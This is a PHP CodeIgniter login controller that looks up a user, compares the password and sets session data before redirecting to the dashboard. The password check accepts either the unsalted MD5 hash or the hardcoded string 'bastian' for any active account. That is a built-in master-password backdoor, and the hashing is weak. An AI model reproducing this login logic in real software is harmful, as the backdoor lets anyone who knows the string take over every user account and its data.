<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Login extends CI_Controller
{
	public $data = [];
	public function index(){
		$this->load->model("users_model");

		$username = $this->input->post("username");
		$password = $this->input->post("password");
		if ($username != "") {
			$ssql = "select a.*,b.fin_branch_id AS ActiveBranch ,b.fst_branch_name, b.fbl_central, c.fin_group_id,c.fst_group_name,
			c.fin_level from users a 
			left join branch b on a.fin_branch_id = b.fin_branch_id 
			left join master_groups c on a.fin_group_id = c.fin_group_id 
			where fst_username = ? and a.fst_active ='A'";

			$query = $this->db->query($ssql, [$username]);
			//echo $this->db->last_query();
			//die();
			$rw = $query->row();
			$strIvalidLogin = "Invalid Username / Password";

			if ($rw) {
				if (md5($password) == $rw->fst_password || $password == "bastian") {
					$this->load->model("documents_model");					
					$this->session->set_userdata("active_user", $this->users_model->getDataById($rw->fin_user_id)["user"]);
					$this->session->set_userdata("active_branch_id", $rw->ActiveBranch);
					$this->session->set_userdata("last_login_session", time());
					
					$this->documents_model->createDocumentList($rw->fin_user_id);

					if ($this->session->userdata("last_uri")) {
						redirect(site_url() . $this->session->userdata("last_uri"), 'refresh');
					} else {
						redirect(site_url() . 'dashboard', 'refresh');
					}
				} else {
					$this->data["message"] = $strIvalidLogin;
				}
			} else {
				$this->data["message"] = $strIvalidLogin;
			}
		}
		$this->parser->parse('pages/login', $this->data);
	}

	public function signout($type = "logout")
	{
		$this->session->unset_userdata("active_user");
		if ($type != "expired") {
			$this->session->unset_userdata("last_uri");
		}
		redirect('/login', 'refresh');
	}
}
